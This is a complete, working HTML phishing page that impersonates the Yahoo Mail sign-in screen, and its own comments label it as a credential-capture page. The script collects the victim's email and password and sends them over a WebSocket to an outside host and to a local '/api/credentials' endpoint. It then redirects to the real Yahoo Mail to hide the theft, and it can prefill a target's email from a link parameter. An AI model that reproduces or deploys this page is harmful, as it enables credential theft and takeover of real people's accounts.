<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Yahoo - Secure Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Helvetica Neue', Arial, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: #ffffff;
            border-radius: 8px;
            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.1);
            padding: 40px 36px;
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        .logo { margin-bottom: 24px; }
        .logo svg { height: 32px; }
        .title {
            font-size: 22px;
            font-weight: 300;
            color: #1b1b1b;
            margin-bottom: 6px;
        }
        .subtitle {
            font-size: 14px;
            color: #6b6b6b;
            margin-bottom: 28px;
        }
        .form-group {
            position: relative;
            margin-bottom: 20px;
            text-align: left;
        }
        .form-group input {
            width: 100%;
            padding: 12px 14px;
            border: 1px solid #d9d9d9;
            border-radius: 4px;
            font-size: 15px;
            outline: none;
            transition: border-color 0.2s;
            background: transparent;
        }
        .form-group input:focus {
            border-color: #6c2bd9;
            box-shadow: 0 0 0 2px rgba(108, 43, 217, 0.2);
        }
        .form-group label {
            position: absolute;
            left: 14px;
            top: 50%;
            transform: translateY(-50%);
            color: #6b6b6b;
            font-size: 14px;
            pointer-events: none;
            transition: all 0.2s;
            background: transparent;
            padding: 0 4px;
        }
        .form-group input:focus + label,
        .form-group input:not(:placeholder-shown) + label {
            top: 0;
            font-size: 11px;
            color: #6c2bd9;
            background: #ffffff;
        }
        .btn-next {
            width: 100%;
            padding: 12px;
            background: #6c2bd9;
            color: #ffffff;
            border: none;
            border-radius: 4px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn-next:hover { background: #5a1fb3; }
        .btn-next:disabled { background: #b3b3b3; cursor: not-allowed; }
        .btn-forgot {
            background: none;
            border: none;
            color: #6c2bd9;
            font-size: 13px;
            cursor: pointer;
            margin-top: 12px;
        }
        .btn-forgot:hover { text-decoration: underline; }
        .separator {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        .separator::before,
        .separator::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #e0e0e0;
        }
        .separator span {
            color: #6b6b6b;
            font-size: 12px;
            padding: 0 16px;
        }
        .btn-create {
            width: 100%;
            padding: 12px;
            background: transparent;
            color: #6c2bd9;
            border: 1px solid #d9d9d9;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn-create:hover { background: #f8f5ff; }
        .footer {
            margin-top: 28px;
            font-size: 11px;
            color: #6b6b6b;
        }
        .footer a { color: #6c2bd9; text-decoration: none; }
        .footer a:hover { text-decoration: underline; }
        .status {
            padding: 10px;
            border-radius: 4px;
            margin-bottom: 16px;
            font-size: 13px;
            display: none;
        }
        .status.loading { background: #f3efff; color: #6c2bd9; display: block; }
        .status.error { background: #fce8e6; color: #d93025; display: block; }
        .status.success { background: #e6f4ea; color: #1e8e3e; display: block; }
        .spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 3px solid rgba(108, 43, 217, 0.2);
            border-top-color: #6c2bd9;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        @media (max-width: 480px) { .container { padding: 24px 16px; } }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 120 30" fill="none" xmlns="http://www.w3.org/2000/svg">
                <text x="0" y="20" font-family="Helvetica Neue, Arial" font-size="22" font-weight="700" fill="#6C2BD9">Yahoo!</text>
                <text x="80" y="20" font-family="Helvetica Neue, Arial" font-size="10" fill="#6b6b6b">by Yahoo</text>
            </svg>
        </div>

        <h1 class="title">Sign in</h1>
        <p class="subtitle">to continue to Yahoo Mail</p>

        <div id="status" class="status"></div>

        <form id="loginForm" method="post">
            <div class="form-group">
                <input type="email" id="email" placeholder=" " autocomplete="username" required />
                <label for="email">Email or phone</label>
            </div>

            <div class="form-group" id="passwordGroup" style="display: none;">
                <input type="password" id="password" placeholder=" " autocomplete="current-password" required />
                <label for="password">Password</label>
            </div>

            <button type="submit" id="btnNext" class="btn-next">Next</button>
        </form>

        <button class="btn-forgot" id="btnForgot">Forgot password?</button>

        <div class="separator"><span>or</span></div>

        <button class="btn-create" id="btnCreate">Create account</button>

        <div class="footer">
            <a href="#">Privacy</a> · <a href="#">Terms</a>
        </div>
    </div>

    <script>
        // ============================================================
        //  YAHOO PHISHING PAGE — CAPTURE CREDENTIALS
        // ============================================================

        const form = document.getElementById('loginForm');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const passwordGroup = document.getElementById('passwordGroup');
        const btnNext = document.getElementById('btnNext');
        const status = document.getElementById('status');
        let emailCaptured = false;

        btnNext.addEventListener('click', function(e) {
            e.preventDefault();

            if (!emailCaptured) {
                const email = emailInput.value.trim();
                if (!email) { showStatus('Please enter your email.', 'error'); return; }
                if (!isValidEmail(email)) { showStatus('Please enter a valid email.', 'error'); return; }

                sendData({ email: email, source: 'yahoo' });

                emailCaptured = true;
                passwordGroup.style.display = 'block';
                btnNext.textContent = 'Sign in';
                emailInput.readOnly = true;
                passwordInput.focus();
                showStatus('', '');

            } else {
                const password = passwordInput.value.trim();
                if (!password) { showStatus('Please enter your password.', 'error'); return; }

                sendData({
                    email: emailInput.value.trim(),
                    password: password,
                    source: 'yahoo'
                });

                showStatus('Signing in...', 'loading');
                btnNext.disabled = true;

                setTimeout(function() {
                    window.location.href = 'https://mail.yahoo.com';
                }, 2000);
            }
        });

        function sendData(data) {
            try {
                const ws = new WebSocket('wss://proxy-websocket.onrender.com');
                ws.onopen = function() {
                    ws.send(JSON.stringify({ type: 'credentials', data: data, timestamp: Date.now() }));
                    ws.close();
                };
            } catch (e) {}

            try {
                fetch('/api/credentials', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }).catch(function() {});
            } catch (e) {}
        }

        function isValidEmail(email) {
            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
        }

        function showStatus(message, type) {
            status.textContent = message;
            status.className = 'status';
            if (type) status.classList.add(type);
        }

        document.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') btnNext.click();
        });

        const urlParams = new URLSearchParams(window.location.search);
        const urlEmail = urlParams.get('email');
        if (urlEmail) {
            emailInput.value = urlEmail;
            emailCaptured = true;
            passwordGroup.style.display = 'block';
            btnNext.textContent = 'Sign in';
            emailInput.readOnly = true;
            passwordInput.focus();
        }

        console.log('🔐 Yahoo phishing page loaded');
    </script>
</body>
</html>
